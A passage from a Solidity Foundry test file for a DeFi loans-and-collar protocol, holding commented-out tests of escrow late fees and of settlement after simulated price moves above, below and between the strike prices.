    //        assertEq(
    //            pair.underlying.balanceOf(escrowSupplier) - escrowSupplierBefore,
    //            underlyingAmount + interestFee + lateFee
    //        );
    //    }

    // commented out because skipping to after min grace period makes price go stale
    //
    //    function testCloseEscrowLoanWithPartialLateFees() public {
    //        //  create provider and escrow offers
    //        (uint offerId, uint escrowOfferId) = createEscrowOffers();
    //        (uint loanId,, uint loanAmount) = executeEscrowLoan(offerId, escrowOfferId);
    //
    //        ILoansNFT.Loan memory loanBefore = pair.loansContract.getLoan(loanId);
    //        uint escrowSupplierBefore = pair.underlying.balanceOf(escrowSupplier);
    //        uint interestFee = pair.escrowNFT.interestFee(escrowOfferId, underlyingAmount);
    //
    //        // Skip past expiry but only halfway through grace period
    //        skip(duration + maxGracePeriod / 2);
    //
    //        // Calculate expected partial late fee
    //        (, uint lateFee) = pair.escrowNFT.currentOwed(loanBefore.escrowId);
    //        assertGt(lateFee, 0);
    //        assertLt(lateFee, underlyingAmount * lateFeeAPR * maxGracePeriod / (BIPS_BASE * 365 days));
    //        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
    //        (uint takerWithdrawal,) = pair.takerNFT.previewSettlement(position, pair.oracle.currentPrice());
    //
    //        closeAndCheckLoan(loanId, loanAmount, loanAmount + takerWithdrawal, lateFee);
    //
    //        // Check escrow position's withdrawable (underlying + interest + partial late fee)
    //        uint withdrawable = pair.escrowNFT.getEscrow(loanBefore.escrowId).withdrawable;
    //        assertEq(withdrawable, underlyingAmount + interestFee + lateFee);
    //
    //        // Execute withdrawal and verify balance
    //        vm.startPrank(escrowSupplier);
    //        pair.escrowNFT.withdrawReleased(loanBefore.escrowId);
    //        vm.stopPrank();
    //
    //        assertEq(
    //            pair.underlying.balanceOf(escrowSupplier) - escrowSupplierBefore,
    //            underlyingAmount + interestFee + lateFee
    //        );
    //    }

    // price movement settlement tests

    //    function testSettlementPriceAboveCallStrike() public {
    //        // Create provider offer & open loan
    //        uint offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, durationPriceMovement, ltv);
    //        (uint loanId,, uint loanAmount) = openLoan(pair, user, underlyingAmount, minLoanAmount, offerId);
    //
    //        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
    //
    //        // a bit over call strike due to time effects on TWAP
    //        uint priceTarget = (pair.oracle.currentPrice() * (position.callStrikePercent + 100) / BIPS_BASE);
    //
    //        skip(durationPriceMovement / 2);
    //
    //        // Move price above call strike using lib
    //        PriceMovementHelper.moveToTargetPrice(
    //            vm,
    //            address(pair.swapperUniV3.uniV3SwapRouter()),
    //            whale,
    //            pair.cashAsset,
    //            pair.underlying,
    //            pair.oracle,
    //            priceTarget,
    //            swapStepCashAmount,
    //            swapPoolFeeTier
    //        );
    //
    //        // moving price takes time, but we need settlement price to be moved
    //        skip(durationPriceMovement / 2);
    //
    //        (uint expectedTakerWithdrawal,) =
    //            pair.takerNFT.previewSettlement(position, pair.oracle.currentPrice());
    //
    //        // Total cash = taker withdrawal + loan repayment
    //        // Convert expected total cash to underlying at current price
    //        uint expectedUnderlyingOut =
    //            pair.oracle.convertToBaseAmount(expectedTakerWithdrawal + loanAmount, pair.oracle.currentPrice());
    //
    //        uint userUnderlyingBefore = pair.underlying.balanceOf(user);
    //
    //        // Close loan and settle
    //        closeAndCheckLoan(loanId, loanAmount, loanAmount + expectedTakerWithdrawal, 0);
    //
    //        // Check provider's withdrawable amount
    //        uint providerWithdrawable = position.providerNFT.getPosition(position.providerId).withdrawable;
    //        assertEq(providerWithdrawable, 0); // everything to user
    //
    //        // Check user's underlying balance change against calculated expected amount
    //        assertApproxEqAbs(
    //            pair.underlying.balanceOf(user) - userUnderlyingBefore,
    //            expectedUnderlyingOut,
    //            expectedUnderlyingOut * slippage / BIPS_BASE // within slippage% of expected
    //        );
    //    }

    //    function testSettlementPriceBelowPutStrike() public {
    //        // Create provider offer & open loan
    //        uint offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, durationPriceMovement, ltv);
    //        (uint loanId,, uint loanAmount) = openLoan(pair, user, underlyingAmount, minLoanAmount, offerId);
    //
    //        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
    //
    //        skip(durationPriceMovement / 2);
    //
    //        // Move price below put strike
    //        PriceMovementHelper.moveToTargetPrice(
    //            vm,
    //            address(pair.swapperUniV3.uniV3SwapRouter()),
    //            whale,
    //            pair.cashAsset,
    //            pair.underlying,
    //            pair.oracle,
    //            (pair.oracle.currentPrice() * position.putStrikePercent / BIPS_BASE),
    //            swapStepCashAmount,
    //            swapPoolFeeTier
    //        );
    //
    //        // moving price takes time, but we need settlement price to be moved
    //        skip(durationPriceMovement / 2);
    //
    //        uint userUnderlyingBefore = pair.underlying.balanceOf(user);
    //        // Close loan
    //        closeAndCheckLoan(loanId, loanAmount, loanAmount, 0);
    //        uint expectedUnderlying = pair.oracle.convertToBaseAmount(loanAmount, pair.oracle.currentPrice());
    //        assertApproxEqAbs(
    //            pair.underlying.balanceOf(user) - userUnderlyingBefore,
    //            expectedUnderlying,
    //            expectedUnderlying * slippage / BIPS_BASE
    //        );
    //        // check provider gets all value
    //        uint providerWithdrawable = position.providerNFT.getPosition(position.providerId).withdrawable;
    //        uint expectedProviderWithdrawable = position.providerLocked + position.takerLocked;
    //        assertEq(providerWithdrawable, expectedProviderWithdrawable);
    //    }

    //    function testSettlementPriceUpBetweenStrikes() public {
    //        // Create provider offer & open loan with longer duration
    //        uint offerId = createProviderOffer(pair, callstrikeToUse, offerAmount, durationPriceMovement, ltv);
    //        (uint loanId,, uint loanAmount) = openLoan(pair, user, underlyingAmount, minLoanAmount, offerId);
    //
    //        ICollarTakerNFT.TakerPosition memory position = pair.takerNFT.getPosition(loanId);
    //
    //        skip(durationPriceMovement / 2);
    //
    //        // Move price half way to call strike using lib
    //        uint halfDeviation = (BIPS_BASE + position.callStrikePercent) / 2;
    //        PriceMovementHelper.moveToTargetPrice(
    //            vm,
    //            address(pair.swapperUniV3.uniV3SwapRouter()),
    //            whale,
    //            pair.cashAsset,
    //            pair.underlying,
    //            pair.oracle,
    //            (pair.oracle.currentPrice() * halfDeviation / BIPS_BASE),
    //            swapStepCashAmount,
    //            swapPoolFeeTier
    //        );
    //
    //        // moving price takes time, but we need settlement price to be moved
    //        skip(durationPriceMovement / 2);
    //
    //        // Calculate expected settlement amounts
    //        uint currentPrice = pair.oracle.currentPrice();
    //        (uint expectedTakerWithdrawal, int expectedProviderDelta) =
    //            pair.takerNFT.previewSettlement(position, currentPrice);
    //
    //        uint userUnderlyingBefore = pair.underlying.balanceOf(user);
    //
    //        // Close loan with total cash needed
    //        closeAndCheckLoan(loanId, loanAmount, loanAmount + expectedTakerWithdrawal, 0);
    //
    //        // User should get underlying equivalent to loanAmount + their settlement gains
    //        uint expectedUnderlying =
    //            pair.oracle.convertToBaseAmount(loanAmount + expectedTakerWithdrawal, currentPrice);
    //        assertApproxEqAbs(
    //            pair.underlying.balanceOf(user) - userUnderlyingBefore,
    //            expectedUnderlying,
    //            expectedUnderlying * slippage / BIPS_BASE
    //        );
    //
    //        // Provider should get their locked amount adjusted by settlement delta
    //        uint providerWithdrawable = position.providerNFT.getPosition(position.providerId).withdrawable;
    //        uint expectedProviderWithdrawable = uint(int(position.providerLocked) + expectedProviderDelta);
    //        assertEq(providerWithdrawable, expectedProviderWithdrawable);
    //    }
}
